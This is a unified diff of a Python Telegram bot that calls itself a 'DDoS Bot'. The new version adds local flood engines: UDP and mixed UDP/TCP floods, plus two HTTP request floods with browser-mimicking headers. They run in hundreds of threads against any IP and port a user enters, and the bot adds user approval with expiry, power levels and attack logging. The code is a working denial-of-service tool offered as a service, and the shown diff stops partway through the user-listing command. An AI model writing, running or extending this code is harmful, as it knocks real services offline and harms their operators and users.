@@ -1,1013 +1,768 @@
 import asyncio
 import logging
-import subprocess
+import threading
+import time
+import random
+import socket
+import re
 from datetime import datetime, timedelta, timezone
 from typing import Dict, Optional, List
 import requests
-from telegram import Update
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
     Application,
     CommandHandler,
+    CallbackQueryHandler,
+    MessageHandler,
     filters,
     ContextTypes
 )
 import pymongo
 from pymongo import MongoClient, ASCENDING, DESCENDING
-from bson import ObjectId
-import re
-from functools import wraps
-import html
 import uuid
 import os
 from dotenv import load_dotenv
+from functools import wraps
 
-# Configure logging
+# ---------- Logging ----------
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
     level=logging.INFO
 )
 logger = logging.getLogger(__name__)
 
-
 load_dotenv()
 
+# ---------- Config ----------
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 MONGODB_URI = os.getenv("MONGODB_URI")
 DATABASE_NAME = os.getenv("DATABASE_NAME", "attack_bot")
-API_URL = os.getenv("API_URL")
-API_KEY = os.getenv("API_KEY")
-ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "1793697840").split(",")]
+ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "8210011971").split(",")]
 
-# Blocked ports (must match backend)
-BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}
+# Blocked ports
+BLOCKED_PORTS = {22, 25, 443, 3389, 8700, 9031, 17500, 20000, 20001, 20002}
+MIN_PORT, MAX_PORT = 1, 65535
 
-# Allowed port range
-MIN_PORT = 1
-MAX_PORT = 65535
+# Attack power levels (3x max – stable for Termux)
+POWER_LEVEL = 3          # 1,2,3
+THREADS_PER_LEVEL = {1: 100, 2: 200, 3: 300}
+HTTP_THREADS = 100
+SOCKETS_PER_THREAD = 3
+DELAY_SEC = 0.0005
 
-# Helper function to make datetime timezone-aware
-def make_aware(dt):
-    """Convert naive datetime to timezone-aware UTC datetime"""
-    if dt is None:
-        return None
-    if hasattr(dt, 'tzinfo') and dt.tzinfo is None:
-        return dt.replace(tzinfo=timezone.utc)
-    return dt
+# Global attack state
+attack_running = False
+attack_threads = []
+current_attack = {
+    'ip': None, 'port': None, 'method': None, 'duration': 0,
+    'start_time': 0, 'packets': 0, 'message_id': None
+}
+attack_lock = threading.Lock()
+user_data = {}   # for attack setup steps
 
-def get_current_time():
-    """Get current UTC time with timezone"""
-    return datetime.now(timezone.utc)
-
-def escape_markdown(text: str) -> str:
-    """Escape special characters for MarkdownV2"""
-    if not text:
-        return ""
-    # List of special characters that need escaping in MarkdownV2
-    special_chars = r'_*[]()~`>#+-=|{}.!'
-    return ''.join(f'\\{char}' if char in special_chars else char for char in str(text))
-
-# MongoDB Connection
+# ---------- MongoDB Database ----------
 class Database:
     def __init__(self):
         self.client = MongoClient(MONGODB_URI)
         self.db = self.client[DATABASE_NAME]
         self.users = self.db.users
         self.attacks = self.db.attacks
-        
-        # Clean up any documents with null user_id
-        try:
-            # Delete documents with null or missing user_id
-            result = self.users.delete_many({"user_id": None})
-            if result.deleted_count > 0:
-                logger.info(f"Deleted {result.deleted_count} documents with null user_id")
-            
-            # Delete documents without user_id field
-            result = self.users.delete_many({"user_id": {"$exists": False}})
-            if result.deleted_count > 0:
-                logger.info(f"Deleted {result.deleted_count} documents without user_id")
-        except Exception as e:
-            logger.error(f"Error cleaning users collection: {e}")
-        
-        # Drop existing indexes to avoid conflicts
-        try:
-            self.users.drop_indexes()
-            logger.info("Dropped all existing indexes from users collection")
-        except Exception as e:
-            logger.info(f"No existing indexes to drop: {e}")
-        
-        try:
-            self.attacks.drop_indexes()
-            logger.info("Dropped all existing indexes from attacks collection")
-        except Exception as e:
-            logger.info(f"No existing indexes to drop: {e}")
-        
-        # Create new indexes for attacks collection
-        try:
-            self.attacks.create_index([("timestamp", DESCENDING)])
-            self.attacks.create_index([("user_id", ASCENDING)])
-            self.attacks.create_index([("status", ASCENDING)])
-            logger.info("Created indexes for attacks collection")
-        except Exception as e:
-            logger.error(f"Error creating attacks indexes: {e}")
-        
-        # Create unique index on user_id for users collection
-        try:
-            self.users.create_index([("user_id", ASCENDING)], unique=True, sparse=True)
-            logger.info("Created unique index on user_id for users collection")
-        except Exception as e:
-            logger.error(f"Error creating users index: {e}")
-        
-    def get_user(self, user_id: int) -> Optional[Dict]:
-        user = self.users.find_one({"user_id": user_id})
-        if user:
-            # Ensure datetime fields are timezone-aware
-            if user.get("created_at"):
-                user["created_at"] = make_aware(user["created_at"])
-            if user.get("approved_at"):
-                user["approved_at"] = make_aware(user["approved_at"])
-            if user.get("expires_at"):
-                user["expires_at"] = make_aware(user["expires_at"])
-        return user
-    
-    def create_user(self, user_id: int, username: str = None) -> Dict:
-        # Check if user already exists
-        existing_user = self.get_user(user_id)
-        if existing_user:
-            return existing_user
-            
+        self._create_indexes()
+
+    def _create_indexes(self):
+        self.users.create_index([("user_id", ASCENDING)], unique=True)
+        self.attacks.create_index([("timestamp", DESCENDING)])
+        self.attacks.create_index([("user_id", ASCENDING)])
+
+    def get_user(self, user_id: int):
+        return self.users.find_one({"user_id": user_id})
+
+    def create_user(self, user_id: int, username: str = None):
+        if self.get_user(user_id):
+            return self.get_user(user_id)
         user_data = {
             "user_id": user_id,
             "username": username,
             "approved": False,
-            "approved_at": None,
             "expires_at": None,
             "total_attacks": 0,
-            "created_at": get_current_time(),
-            "is_banned": False
+            "created_at": datetime.now(timezone.utc)
         }
-        try:
-            self.users.insert_one(user_data)
-            logger.info(f"Created new user: {user_id}")
-        except pymongo.errors.DuplicateKeyError:
-            # User already exists, fetch it
-            user_data = self.get_user(user_id)
-            logger.info(f"User {user_id} already exists")
-        except Exception as e:
-            logger.error(f"Error creating user: {e}")
+        self.users.insert_one(user_data)
         return user_data
-    
+
     def approve_user(self, user_id: int, days: int) -> bool:
-        expires_at = get_current_time() + timedelta(days=days)
+        expires_at = datetime.now(timezone.utc) + timedelta(days=days)
         result = self.users.update_one(
             {"user_id": user_id},
-            {
-                "$set": {
-                    "approved": True,
-                    "approved_at": get_current_time(),
-                    "expires_at": expires_at
-                }
-            }
+            {"$set": {"approved": True, "expires_at": expires_at}}
         )
         return result.modified_count > 0
-    
+
     def disapprove_user(self, user_id: int) -> bool:
         result = self.users.update_one(
             {"user_id": user_id},
-            {
-                "$set": {
-                    "approved": False,
-                    "expires_at": None
-                }
-            }
+            {"$set": {"approved": False, "expires_at": None}}
         )
         return result.modified_count > 0
-    
-    def log_attack(self, user_id: int, ip: str, port: int, duration: int, status: str, response: str = None):
+
+    def log_attack(self, user_id: int, ip: str, port: int, duration: int, status: str, method: str, packets: int):
         attack_data = {
-            "_id": str(uuid.uuid4()),  # Generate unique ID for each attack
+            "_id": str(uuid.uuid4()),
             "user_id": user_id,
             "ip": ip,
             "port": port,
             "duration": duration,
+            "method": method,
+            "packets": packets,
             "status": status,
-            "response": response[:500] if response else None,  # Limit response length
-            "timestamp": get_current_time()
+            "timestamp": datetime.now(timezone.utc)
         }
-        try:
-            self.attacks.insert_one(attack_data)
-            
-            # Update user attack count
-            self.users.update_one(
-                {"user_id": user_id},
-                {"$inc": {"total_attacks": 1}}
-            )
-            logger.info(f"Logged attack for user {user_id}: {status}")
-        except Exception as e:
-            logger.error(f"Failed to log attack: {e}")
-    
-    def get_all_users(self) -> List[Dict]:
-        users = list(self.users.find({"user_id": {"$ne": None, "$exists": True}}))
-        for user in users:
-            if user.get("created_at"):
-                user["created_at"] = make_aware(user["created_at"])
-            if user.get("approved_at"):
-                user["approved_at"] = make_aware(user["approved_at"])
-            if user.get("expires_at"):
-                user["expires_at"] = make_aware(user["expires_at"])
-            # Ensure total_attacks exists
-            if "total_attacks" not in user:
-                user["total_attacks"] = 0
-        return users
-    
-    def get_approved_users(self) -> List[Dict]:
-        users = list(self.users.find({"approved": True, "is_banned": False, "user_id": {"$ne": None}}))
-        for user in users:
-            if user.get("created_at"):
-                user["created_at"] = make_aware(user["created_at"])
-            if user.get("approved_at"):
-                user["approved_at"] = make_aware(user["approved_at"])
-            if user.get("expires_at"):
-                user["expires_at"] = make_aware(user["expires_at"])
-        return users
-    
-    def get_user_attack_stats(self, user_id: int) -> Dict:
-        """Get attack statistics for a user"""
-        total_attacks = self.attacks.count_documents({"user_id": user_id})
-        successful_attacks = self.attacks.count_documents({"user_id": user_id, "status": "success"})
-        failed_attacks = self.attacks.count_documents({"user_id": user_id, "status": "failed"})
-        
-        # Get recent attacks
-        recent_attacks = list(self.attacks.find(
-            {"user_id": user_id}
-        ).sort("timestamp", -1).limit(10))
-        
-        # Ensure timestamps are timezone-aware
-        for attack in recent_attacks:
-            if attack.get("timestamp"):
-                attack["timestamp"] = make_aware(attack["timestamp"])
-        
-        return {
-            "total": total_attacks,
-            "successful": successful_attacks,
-            "failed": failed_attacks,
-            "recent": recent_attacks
-        }
+        self.attacks.insert_one(attack_data)
+        self.users.update_one({"user_id": user_id}, {"$inc": {"total_attacks": 1}})
 
-# Initialize database
-print("🔄 Initializing database connection...")
+    def get_all_users(self):
+        return list(self.users.find({"user_id": {"$ne": None}}))
+
+    def get_user_attack_stats(self, user_id: int):
+        total = self.attacks.count_documents({"user_id": user_id})
+        success = self.attacks.count_documents({"user_id": user_id, "status": "success"})
+        failed = self.attacks.count_documents({"user_id": user_id, "status": "failed"})
+        recent = list(self.attacks.find({"user_id": user_id}).sort("timestamp", -1).limit(10))
+        return {"total": total, "successful": success, "failed": failed, "recent": recent}
+
 db = Database()
-print("✅ Database initialized successfully!")
 
-# Port validation functions
-def is_port_blocked(port: int) -> bool:
-    """Check if port is in blocked list"""
+# ---------- Helper functions ----------
+def make_aware(dt):
+    if dt and dt.tzinfo is None:
+        return dt.replace(tzinfo=timezone.utc)
+    return dt
+
+def get_current_time():
+    return datetime.now(timezone.utc)
+
+def is_port_blocked(port):
     return port in BLOCKED_PORTS
 
-def get_blocked_ports_list() -> str:
-    """Get formatted list of blocked ports"""
-    return ", ".join(str(port) for port in sorted(BLOCKED_PORTS))
+def get_blocked_ports_list():
+    return ", ".join(str(p) for p in sorted(BLOCKED_PORTS))
 
-# Authentication decorator for admin commands
+async def is_user_approved(user_id: int) -> bool:
+    user = db.get_user(user_id)
+    if not user or not user.get("approved"):
+        return False
+    expires = user.get("expires_at")
+    if expires and make_aware(expires) < get_current_time():
+        return False
+    return True
+
 def admin_required(func):
     @wraps(func)
-    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
-        user_id = update.effective_user.id
-        if user_id not in ADMIN_IDS:
-            await update.message.reply_text("❌ You are not authorized to use this command.")
+    async def wrapper(update, context, *args, **kwargs):
+        if update.effective_user.id not in ADMIN_IDS:
+            await update.message.reply_text("❌ Unauthorized")
             return
         return await func(update, context, *args, **kwargs)
     return wrapper
 
-# Check if user is approved
-async def is_user_approved(user_id: int) -> bool:
+# ---------- Attack Engines (from previous powerful bot) ----------
+def udp_flood(ip, port, duration):
+    global attack_running, current_attack
+    timeout = time.time() + duration
+    port = int(port)
+    socks = []
+    for _ in range(SOCKETS_PER_THREAD):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            socks.append(s)
+        except:
+            pass
+    payload = random._urandom(512)
+    while time.time() < timeout and attack_running:
+        for sock in socks:
+            try:
+                sock.sendto(payload, (ip, port))
+                with attack_lock:
+                    current_attack['packets'] += 1
+            except:
+                pass
+        time.sleep(DELAY_SEC)
+    for sock in socks:
+        sock.close()
+
+def mixed_attack(ip, port, duration):
+    global attack_running, current_attack
+    timeout = time.time() + duration
+    udp_socks = []
+    for _ in range(SOCKETS_PER_THREAD):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            udp_socks.append(s)
+        except:
+            pass
+    payload = random._urandom(512)
+    while time.time() < timeout and attack_running:
+        for sock in udp_socks:
+            try:
+                sock.sendto(payload, (ip, int(port)))
+                with attack_lock:
+                    current_attack['packets'] += 1
+            except:
+                pass
+        try:  # TCP SYN
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(0.1)
+            s.connect_ex((ip, int(port)))
+            s.close()
+            with attack_lock:
+                current_attack['packets'] += 1
+        except:
+            pass
+        time.sleep(DELAY_SEC)
+    for sock in udp_socks:
+        sock.close()
+
+def http_emulate_flood(target_url, duration):
+    global attack_running, current_attack
+    timeout = time.time() + duration
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.5',
+        'Accept-Encoding': 'gzip, deflate',
+        'Connection': 'keep-alive',
+    }
+    session = requests.Session()
+    while time.time() < timeout and attack_running:
+        try:
+            url = f"{target_url}?rand={random.randint(1,999999)}"
+            session.get(url, headers=headers, timeout=5, verify=False)
+            with attack_lock:
+                current_attack['packets'] += 1
+            time.sleep(random.uniform(0.01, 0.05))
+        except:
+            time.sleep(0.2)
+    session.close()
+
+def http_connect_flood(target_url, duration):
+    global attack_running, current_attack
+    timeout = time.time() + duration
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Accept': '*/*',
+        'Connection': 'keep-alive',
+    }
+    session = requests.Session()
+    reset_interval = 0.01
+    while time.time() < timeout and attack_running:
+        try:
+            resp = session.get(target_url, headers=headers, timeout=5, stream=True)
+            resp.close()
+            with attack_lock:
+                current_attack['packets'] += 1
+            time.sleep(reset_interval)
+        except:
+            time.sleep(0.05)
+    session.close()
+
+# ---------- Attack Launcher with Monitoring and Inline buttons ----------
+def launch_attack(ip, port, duration, method, send_func):
+    global attack_running, attack_threads, current_attack
+
+    attack_running = True
+    with attack_lock:
+        current_attack = {
+            'ip': ip, 'port': port, 'method': method, 'duration': duration,
+            'start_time': time.time(), 'packets': 0, 'message_id': None
+        }
+
+    keyboard = [
+        [InlineKeyboardButton("🛑 STOP ATTACK", callback_data="stop_attack")],
+        [InlineKeyboardButton("ℹ️ INFO", callback_data="info_attack"), InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_attack")],
+        [InlineKeyboardButton("❌ CANCEL", callback_data="cancel_attack")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+
+    # Select attack function and thread count
+    if method == 'udp':
+        num_threads = THREADS_PER_LEVEL[POWER_LEVEL]
+        target_func = udp_flood
+        target_args = (ip, port, duration)
+        attack_type = "UDP"
+    elif method == 'mixed':
+        num_threads = THREADS_PER_LEVEL[POWER_LEVEL]
+        target_func = mixed_attack
+        target_args = (ip, port, duration)
+        attack_type = "Mixed"
+    elif method == 'http_emulate':
+        num_threads = HTTP_THREADS
+        target_url = f"http://{ip}:{port}" if port != 443 else f"https://{ip}:{port}"
+        target_func = http_emulate_flood
+        target_args = (target_url, duration)
+        attack_type = "HTTP-Emulate"
+    elif method == 'http_connect':
+        num_threads = HTTP_THREADS
+        target_url = f"http://{ip}:{port}" if port != 443 else f"https://{ip}:{port}"
+        target_func = http_connect_flood
+        target_args = (target_url, duration)
+        attack_type = "HTTP-Connect"
+    else:
+        return
+
+    # Send initial message
+    start_msg = send_func(
+        f"🔥 *ATTACK STARTING* 🔥\n\n"
+        f"🎯 Target: `{ip}:{port}`\n"
+        f"⚙️ Method: `{method.upper()}` ({attack_type})\n"
+        f"🧵 Threads: `{num_threads}`\n"
+        f"⏱️ Duration: `{duration}s`\n\n"
+        f"_Launching threads..._",
+        reply_markup, edit=False
+    )
+    if start_msg:
+        current_attack['message_id'] = start_msg.message_id
+
+    # Start attack threads
+    attack_threads = []
+    for _ in range(num_threads):
+        t = threading.Thread(target=target_func, args=target_args, daemon=True)
+        t.start()
+        attack_threads.append(t)
+
+    # Monitoring loop
+    start_time = time.time()
+    last_update = 0
+    while attack_running and (time.time() - start_time) < duration:
+        time.sleep(1)
+        elapsed = int(time.time() - start_time)
+        remaining = duration - elapsed
+        if time.time() - last_update >= 2:
+            last_update = time.time()
+            with attack_lock:
+                pkt = current_attack['packets']
+            progress = int((elapsed / duration) * 20)
+            bar = "█" * progress + "░" * (20 - progress)
+            speed = int(pkt / elapsed) if elapsed else 0
+            text = (
+                f"🔥 *ATTACK IN PROGRESS* 🔥\n\n"
+                f"🎯 `{ip}:{port}`\n"
+                f"⚙️ Method: `{method.upper()}`\n"
+                f"📦 Packets: `{pkt:,}`\n"
+                f"⏱️ Time: `{elapsed}/{duration}s`\n"
+                f"📊 `[{bar}]`\n"
+                f"💥 Speed: `{speed:,}` pps\n"
+                f"🧵 Threads: `{num_threads}`\n\n"
+                f"🔘 *Buttons below*"
+            )
+            try:
+                send_func(text, reply_markup, edit=True, msg_id=current_attack['message_id'])
+            except:
+                pass
+
+    # Attack finished
+    attack_running = False
+    for t in attack_threads:
+        t.join(timeout=0.5)
+
+    with attack_lock:
+        pkt = current_attack['packets']
+    speed = int(pkt / duration) if duration else 0
+    text = (
+        f"✅ *ATTACK COMPLETED* ✅\n\n"
+        f"🎯 `{ip}:{port}`\n"
+        f"⚙️ Method: `{method.upper()}`\n"
+        f"📦 Total Packets: `{pkt:,}`\n"
+        f"⏱️ Duration: `{duration}s`\n"
+        f"💥 Avg Speed: `{speed:,}` pps\n"
+    )
+    try:
+        send_func(text, None, edit=True, msg_id=current_attack['message_id'])
+    except:
+        pass
+
+    # Log to database
+    db.log_attack(ADMIN_IDS[0] if ADMIN_IDS else 0, ip, port, duration, "success", method, pkt)
+
+# ---------- Telegram Handlers ----------
+async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    username = update.effective_user.username
+    db.create_user(user_id, username)
+
+    if await is_user_approved(user_id):
+        user_data[user_id] = {'step': 'ip'}   # start attack setup
+        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="cancel_setup")]]
+        await update.message.reply_text(
+            "⚡ *DDoS Bot (Local Engine)* ⚡\n\n"
+            "Send target *IP address*:\nExample: `192.168.1.1`\n\n"
+            f"🔥 Power: `{POWER_LEVEL}x` (L4 threads: {THREADS_PER_LEVEL[POWER_LEVEL]})\n"
+            f"🌐 L7 threads: {HTTP_THREADS}\n"
+            f"✅ Use `/power 1-3` to change level",
+            parse_mode='Markdown',
+            reply_markup=InlineKeyboardMarkup(keyboard)
+        )
+    else:
+        await update.message.reply_text(
+            "❌ *Access Denied*\n\nYour account is not approved. Contact admin.",
+            parse_mode='Markdown'
+        )
+
+async def power_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global POWER_LEVEL
+    if update.effective_user.id not in ADMIN_IDS:
+        await update.message.reply_text("❌ Unauthorized")
+        return
+    if not context.args:
+        await update.message.reply_text(f"Current power: `{POWER_LEVEL}x` (1-3)", parse_mode='Markdown')
+        return
+    try:
+        level = int(context.args[0])
+        if level in [1,2,3]:
+            POWER_LEVEL = level
+            await update.message.reply_text(f"✅ Power set to `{level}x` → L4 threads: {THREADS_PER_LEVEL[level]}")
+        else:
+            await update.message.reply_text("❌ Use 1, 2 or 3")
+    except:
+        await update.message.reply_text("❌ Invalid number")
+
+async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global attack_running
+    if update.effective_user.id not in ADMIN_IDS:
+        await update.message.reply_text("❌ Unauthorized")
+        return
+    attack_running = False
+    await update.message.reply_text("🛑 *Attack stopped by command*", parse_mode='Markdown')
+
+async def myinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
     user = db.get_user(user_id)
     if not user:
-        return False
-    
-    if not user.get("approved", False):
-        return False
-    
-    # Check expiration
-    expires_at = user.get("expires_at")
-    if expires_at:
-        # Ensure expires_at is timezone-aware
-        expires_at = make_aware(expires_at)
-        if expires_at < get_current_time():
-            return False
-    
-    return True
+        await update.message.reply_text("❌ Not found. Use /start first.")
+        return
+    status = "✅ Approved" if user.get("approved") else "❌ Not approved"
+    expiry = user.get("expires_at")
+    if expiry:
+        expiry = make_aware(expiry)
+        days_left = (expiry - get_current_time()).days
+        expiry_str = f"{days_left} days" if days_left >= 0 else "Expired"
+    else:
+        expiry_str = "Never"
+    await update.message.reply_text(
+        f"📋 *Your Account*\n\n"
+        f"🆔 ID: `{user['user_id']}`\n"
+        f"👤 Username: @{user.get('username', 'N/A')}\n"
+        f"📊 Status: {status}\n"
+        f"⏰ Expires: {expiry_str}\n"
+        f"🎯 Total Attacks: {user.get('total_attacks', 0)}\n"
+        f"📅 Member since: {user.get('created_at').strftime('%Y-%m-%d') if user.get('created_at') else 'N/A'}",
+        parse_mode='Markdown'
+    )
 
-# API Functions - FIXED with correct endpoints (all require API key)
-def check_api_health() -> Dict:
-    """Check API health status - REQUIRES API KEY"""
-    try:
-        response = requests.get(
-            f"{API_URL}/api/v1/health",  # Added /api/v1/ prefix
-            headers={"x-api-key": API_KEY, "Content-Type": "application/json"},
-            timeout=10
-        )
-        if response.status_code == 200:
-            return response.json()
-        else:
-            return {"status": "error", "error": f"HTTP {response.status_code}"}
-    except Exception as e:
-        logger.error(f"Health check error: {e}")
-        return {"status": "error", "error": str(e)}
+async def mystats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not await is_user_approved(user_id):
+        await update.message.reply_text("❌ Not approved")
+        return
+    stats = db.get_user_attack_stats(user_id)
+    success_rate = (stats['successful']/stats['total']*100 if stats['total'] else 0)
+    msg = (
+        f"📊 *Your Stats*\n\n"
+        f"🎯 Total: `{stats['total']}`\n"
+        f"✅ Success: `{stats['successful']}`\n"
+        f"❌ Failed: `{stats['failed']}`\n"
+        f"📈 Rate: `{success_rate:.1f}%`\n\n"
+    )
+    if stats['recent']:
+        msg += "🕐 Recent attacks:\n"
+        for a in stats['recent'][:5]:
+            icon = "✅" if a['status'] == 'success' else "❌"
+            msg += f"{icon} {a['ip']}:{a['port']} ({a['method']}) - {a['duration']}s\n"
+    await update.message.reply_text(msg, parse_mode='Markdown')
 
-def check_running_attacks() -> Dict:
-    """Check running attacks for the user - REQUIRES API KEY"""
-    try:
-        response = requests.get(
-            f"{API_URL}/api/v1/active",  # Added /api/v1/ prefix
-            headers={"x-api-key": API_KEY, "Content-Type": "application/json"},
-            timeout=10
-        )
-        if response.status_code == 200:
-            return response.json()
-        else:
-            return {"success": False, "error": f"HTTP {response.status_code}"}
-    except Exception as e:
-        logger.error(f"Running attacks error: {e}")
-        return {"success": False, "error": str(e)}
+async def blocked_ports_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        f"🚫 *Blocked Ports*\n\n{get_blocked_ports_list()}\n\n"
+        f"✅ Allowed: 1-65535 except above",
+        parse_mode='Markdown'
+    )
 
-def get_user_stats() -> Dict:
-    """Get user statistics - REQUIRES API KEY"""
-    try:
-        response = requests.get(
-            f"{API_URL}/api/v1/stats",  # Added /api/v1/ prefix
-            headers={"x-api-key": API_KEY, "Content-Type": "application/json"},
-            timeout=10
-        )
-        if response.status_code == 200:
-            return response.json()
-        else:
-            return {"success": False, "error": f"HTTP {response.status_code}"}
-    except Exception as e:
-        logger.error(f"Get stats error: {e}")
-        return {"success": False, "error": str(e)}
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    is_admin = user_id in ADMIN_IDS
+    msg = (
+        "🤖 *DDoS Bot Help*\n\n"
+        "/start – Begin attack setup\n"
+        "/power 1-3 – Set L4 power (1=100,2=200,3=300 threads)\n"
+        "/stop – Emergency stop\n"
+        "/myinfo – Account info\n"
+        "/mystats – Attack statistics\n"
+        "/blockedports – Show blocked ports\n"
+    )
+    if is_admin:
+        msg += "\n👑 *Admin commands*\n/approve <id> <days>\n/disapprove <id>\n/users\n"
+    await update.message.reply_text(msg, parse_mode='Markdown')
 
-def launch_attack(ip: str, port: int, duration: int) -> Dict:
-    """Launch attack via API - REQUIRES API KEY"""
-    try:
-        response = requests.post(
-            f"{API_URL}/api/v1/attack",  # Added /api/v1/ prefix
-            json={"ip": ip, "port": port, "duration": duration},
-            headers={"x-api-key": API_KEY, "Content-Type": "application/json"},
-            timeout=15
-        )
-        return response.json()
-    except Exception as e:
-        logger.error(f"Attack launch error: {e}")
-        return {"error": str(e), "success": False}
-
-# Bot Command Handlers
 @admin_required
 async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Approve a user to use the bot: /approve userid days"""
+    if len(context.args) < 2:
+        await update.message.reply_text("❌ /approve <user_id> <days>")
+        return
     try:
-        if len(context.args) < 2:
-            await update.message.reply_text(
-                "❌ Usage: /approve <user_id> <days>\n\n"
-                "Example: /approve 123456789 30"
-            )
-            return
-        
         user_id = int(context.args[0])
         days = int(context.args[1])
-        
-        if days <= 0:
-            await update.message.reply_text("❌ Days must be a positive number.")
-            return
-        
-        # Check if user exists
-        user = db.get_user(user_id)
-        if not user:
-            # Create user if not exists
-            db.create_user(user_id)
-        
-        # Approve user
-        if db.approve_user(user_id, days):
-            expires_at = get_current_time() + timedelta(days=days)
-            await update.message.reply_text(
-                f"✅ User {user_id} has been approved for {days} days!\n"
-                f"📅 Expires on: {expires_at.strftime('%Y-%m-%d %H:%M:%S')} UTC"
-            )
-            
-            # Notify the user if they have started the bot
-            try:
-                await context.bot.send_message(
-                    user_id,
-                    f"✅ Congratulations! Your account has been approved for {days} days.\n"
-                    f"📅 Expires on: {expires_at.strftime('%Y-%m-%d %H:%M:%S')} UTC\n\n"
-                    f"Use /help to see available commands."
-                )
-            except Exception as e:
-                logger.error(f"Failed to notify user: {e}")
-        else:
-            await update.message.reply_text("❌ Failed to approve user.")
-            
-    except ValueError:
-        await update.message.reply_text("❌ Invalid user ID or days. Please use numbers only.")
-    except Exception as e:
-        logger.error(f"Approve error: {e}")
-        await update.message.reply_text(f"❌ Error: {str(e)}")
+        db.approve_user(user_id, days)
+        await update.message.reply_text(f"✅ User {user_id} approved for {days} days")
+        try:
+            await context.bot.send_message(user_id, f"✅ Your account approved for {days} days!")
+        except:
+            pass
+    except:
+        await update.message.reply_text("❌ Invalid input")
 
 @admin_required
 async def disapprove_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Disapprove a user: /disapprove userid"""
+    if len(context.args) < 1:
+        await update.message.reply_text("❌ /disapprove <user_id>")
+        return
     try:
-        if len(context.args) < 1:
-            await update.message.reply_text("❌ Usage: /disapprove <user_id>")
-            return
-        
         user_id = int(context.args[0])
-        
-        if db.disapprove_user(user_id):
-            await update.message.reply_text(f"✅ User {user_id} has been disapproved.")
-            
-            # Notify the user
-            try:
-                await context.bot.send_message(
-                    user_id,
-                    "❌ Your access has been revoked. Please contact admin for more information."
-                )
-            except Exception as e:
-                logger.error(f"Failed to notify user: {e}")
-        else:
-            await update.message.reply_text("❌ Failed to disapprove user. User may not exist.")
-            
-    except ValueError:
-        await update.message.reply_text("❌ Invalid user ID.")
-    except Exception as e:
-        logger.error(f"Disapprove error: {e}")
-        await update.message.reply_text(f"❌ Error: {str(e)}")
-
-@admin_required
-async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Check API health status: /status"""
-    status_msg = await update.message.reply_text("🔄 Checking API health status...")
-    
-    health = check_api_health()
-    
-    if health.get("status") == "ok":
-        message = (
-            f"✅ API Status: Healthy\n\n"
-            f"🕐 Timestamp: {health.get('timestamp', 'N/A')}\n"
-            f"📦 Version: {health.get('version', 'N/A')}\n\n"
-            f"🌐 API URL: {API_URL}"
-        )
-    else:
-        message = (
-            f"❌ API Status: Unhealthy\n\n"
-            f"Error: {health.get('error', 'Unknown error')}\n\n"
-            f"🌐 API URL: {API_URL}\n\n"
-            f"Possible issues:\n"
-            f"• API server is down\n"
-            f"• Network connection problem\n"
-            f"• Invalid API key"
-        )
-    
-    await status_msg.edit_text(message)
-
-@admin_required
-async def running_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Check running attacks: /running"""
-    status_msg = await update.message.reply_text("🔄 Fetching active attacks...")
-    
-    attacks = check_running_attacks()
-    
-    if attacks.get("success"):
-        active_attacks = attacks.get("activeAttacks", [])
-        if active_attacks:
-            message = f"🎯 Active Attacks ({len(active_attacks)})\n\n"
-            for attack in active_attacks:
-                message += (
-                    f"🔹 Target: {attack['target']}:{attack['port']}\n"
-                    f"   ⏱️ Expires in: {attack['expiresIn']}s\n"
-                    f"   🆔 ID: {attack['attackId'][:8]}...\n\n"
-                )
-        else:
-            message = "✅ No active attacks running."
-        
-        message += f"\n📊 Limits:\n"
-        message += f"   • Current: {attacks.get('count', 0)} / {attacks.get('maxConcurrent', 0)}\n"
-        message += f"   • Remaining slots: {attacks.get('remainingSlots', 0)}"
-    else:
-        message = f"❌ Failed to fetch active attacks\n\nError: {attacks.get('error', 'Unknown error')}"
-    
-    await status_msg.edit_text(message)
+        db.disapprove_user(user_id)
+        await update.message.reply_text(f"✅ User {user_id} disapproved")
+    except:
+        await update.message.reply_text("❌ Error")
 
 @admin_required
 async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """List all users: /users"""
-    try:
-        users = db.get_all_users()
-        
-        if not users:
-            await update.message.reply_text("📭 No users found.")
-            return
-        
-        approved_count = sum(1 for u in users if u.get("approved", False))
-        total_attacks = sum(u.get("total_attacks", 0) for u in users)
-        
-        message = f"👥 User Statistics\n\n"
-        message += f"📊 Total Users: {len(users)}\n"
-        message += f"✅ Approved Users: {approved_count}\n"
